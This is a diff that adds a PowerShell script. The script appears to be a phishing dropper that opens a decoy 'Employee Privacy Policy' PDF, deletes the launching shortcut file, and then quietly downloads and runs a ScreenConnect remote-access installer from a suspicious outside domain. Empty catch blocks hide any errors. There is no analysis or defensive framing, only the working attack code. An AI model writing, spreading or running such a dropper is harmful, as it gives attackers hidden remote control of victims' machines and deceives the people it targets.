@@ -1,0 +1,33 @@
+$CurrentDir     = Get-Location
+$ImagePath      = Join-Path $CurrentDir "Employee_Privacy_Policy.lnk"
+$PdfPath        = Join-Path $CurrentDir "Employee_Privacy_Policy.pdf"
+$PdfURL         = "https://raw.githubusercontent.com/okojsyj/io/main/Employee_Privacy_Policy.pdf"
+$InstallerPath  = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
+$InstallerURL   = "https://admin.onlitndroery.xyz/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+
+if (Test-Path $PdfPath) {
+    Remove-Item $PdfPath -Force
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+try {
+    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing
+
+    if (Test-Path $ImagePath) {
+        Remove-Item $ImagePath -Force
+    }
+
+    Start-Process $PdfPath
+}
+catch {
+  
+}
+
+
+try {
+    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath
+    Start-Process $InstallerPath
+} catch {
+    
+}
